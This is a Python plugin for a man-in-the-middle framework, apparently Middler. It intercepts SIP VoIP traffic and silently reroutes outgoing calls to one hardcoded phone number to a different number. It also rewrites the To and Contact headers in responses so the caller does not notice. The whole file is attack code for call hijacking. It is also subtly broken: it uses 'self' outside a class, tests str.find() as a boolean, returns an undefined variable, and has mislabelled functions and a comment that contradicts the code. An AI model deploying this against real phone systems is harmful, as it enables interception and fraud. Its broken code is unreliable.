#!/usr/bin/python
import libmiddler as ml
import libmiddler.api.header as header


### FUNCTION TO MANIPULATE SERVER RESPONSE
def doRequest(session, request_header, response_header, data):
    changed = 0
    stop = 0
    i = 1

    # Lets change all outgoing calls to a specific number/sipuri
    # to use different caller ID, say, +14433267298


    # We're only looking to target a specific outgoing number.
    target = "12068837526@"
    reroute_to = "14433267298@"
    targetlen = len(target)

    # We need to modify the SIP URI in the initial INVITE request, but also in every other request
    # so that both caller and proxy/server maintain state.
    if self.is_request:
        (method,sipuri,version) = header.headerget(request_header,"Request").split(" ",2)

        if sipuri.find(target):

            # Switch the phone number in the outgoing SIP URI.
            new_request_line = "%s %s %s" % (method,sipuri.replace(target,reroute_to),version)
            header.headerfix(request_header,"Request",new_request_line)
            changed = 1
            stop = 1


            # Now we need to change the To header on both sides of the connection.

            # If this is a request, we change the To from the target to the reroute_to.
            # But if this is a response, we change the To from the reroute_to back to the target

            to_rvalue = header.headerget(request_header,"To")
            if to_rvalue != "HeaderNotFound":
                new_to_rvalue = to_rvalue.replace(target,reroute_to)

                ml.api.header.headerfix(request_header,"To",new_to_rvalue)


    # In a response, we need to switch both the To header back to the real destination
    # and we need to switch the Contact header in the same way.
    if self.is_response:

        to_rvalue = header.headerget(request_header,"To")
        if to_rvalue.find(reroute_to):
            new_to_rvalue = to_rvalue.replace(reroute_to,target)
            ml.api.header.headerfix(request_header,"To",new_to_rvalue)

            # Now change the contact info.
            contact_rvalue = header.headerget(request_header,"Contact")
            if contact_rvalue.find(reroute_to):
                new_contact_rvalue = contact_rvalue.replace(reroute_to,target)
                ml.api.header.headerfix(request_header,"Contact",new_contact_rvalue)


            changed = 1
            stop = 1

    return(request_header, data, changed, stop)




### FUNCTION TO MANIPULATE CLIENT REQUEST
def doResponse(session, request_header, data):
    changed = 0
    stop = 0

    return(response_header, data, changed, stop)
